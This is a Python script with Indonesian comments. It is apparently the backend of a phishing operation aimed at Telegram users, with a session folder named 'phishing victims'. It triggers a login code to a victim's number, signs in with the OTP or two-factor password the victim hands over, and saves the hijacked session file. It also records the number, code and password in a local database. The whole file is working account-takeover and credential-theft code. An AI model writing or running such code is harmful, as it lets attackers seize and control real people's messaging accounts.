import json
import os
import sqlite3
from datetime import datetime
import pytz
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import asyncio
from termcolor import colored

# Konfigurasi Zona Waktu
tz = pytz.timezone("Asia/Jakarta")
now = datetime.now(tz)

# Folder penyimpanan sesi
session_folder = "korban_phising"
os.makedirs(session_folder, exist_ok=True)

# Konfigurasi Database
db_path = "data_phising.db"
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone_number TEXT,
        otp TEXT,
        password TEXT,
        session_file TEXT,
        login_time TEXT
    )
""")
conn.commit()
conn.close()


class SendRequestLogin:
    def __init__(self, phone_number, api_id, api_hash):
        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone_number
        self.session_path = os.path.join(session_folder, f"{self.phone_number}_{now.strftime('%d%m%y%H%M%S')}.session")
        self.client = TelegramClient(self.session_path, self.api_id, self.api_hash)
        self.phone_code_hash_map = {}

    async def send_request_code(self):
        await self.client.connect()
        try:
            print(f"Mengirim permintaan OTP ke {self.phone_number}...")
            result = await self.client.send_code_request(self.phone_number)
            self.phone_code_hash_map[self.phone_number] = result.phone_code_hash

            # Simpan phone_code_hash ke file JSON
            with open("phone_hash.json", "w") as file:
                json.dump({self.phone_number: result.phone_code_hash}, file)

            print(colored("Permintaan OTP berhasil dikirim.", "green"))
            return result.phone_code_hash
        except Exception as e:
            print(colored(f"Terjadi kesalahan saat mengirim permintaan OTP: {e}", "red"))

    async def login_by_code(self, otp):
        await self.client.connect()
        try:
            # Ambil phone_code_hash dari file JSON
            with open("phone_hash.json", "r") as file:
                phone_code_hash_map = json.load(file)

            phone_code_hash = phone_code_hash_map.get(self.phone_number)

            if not phone_code_hash:
                print(colored("Error: phone_code_hash tidak ditemukan. Pastikan Anda telah mengirim OTP.", "red"))
                return

            print(f"Login dengan OTP: {otp}")

            await self.client.sign_in(self.phone_number, code=otp, phone_code_hash=phone_code_hash)

            me = await self.client.get_me()
            print(colored(f"Login berhasil! Nama Pengguna: {me.username}", "green"))

            # Simpan ke database
            self.save_to_database(self.phone_number, otp, None, self.session_path)

        except PhoneCodeInvalidError:
            print(colored("Kode OTP yang dimasukkan tidak valid.", "red"))
        except SessionPasswordNeededError:
            print("Akun memerlukan kata sandi untuk login. Silakan masukkan kata sandi.")
        except Exception as e:
            print(colored(f"Terjadi kesalahan: {str(e)}", "red"))
        finally:
            await self.client.disconnect()

    async def login_by_password(self, password):
        await self.client.connect()
        try:
            await self.client.sign_in(phone=self.phone_number, password=password)
            me = await self.client.get_me()
            print(colored(f"Login berhasil dengan password! Nama Pengguna: {me.username}", "green"))

            # Simpan ke database
            self.save_to_database(self.phone_number, None, password, self.session_path)

        except Exception as e:
            print(colored(f"Terjadi kesalahan saat login dengan password: {str(e)}", "red"))
        finally:
            await self.client.disconnect()

    def save_to_database(self, phone_number, otp, password, session_file):
        """Simpan data ke database SQLite jika login berhasil"""
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO logins (phone_number, otp, password, session_file, login_time)
            VALUES (?, ?, ?, ?, ?)
        """, (phone_number, otp, password, session_file, now.strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
        print(colored("Data login berhasil disimpan ke database.", "yellow"))


# Contoh penggunaan:
# bot = TelegramBot("+6281234567890", API_ID, API_HASH)
# asyncio.run(bot.send_request_code())
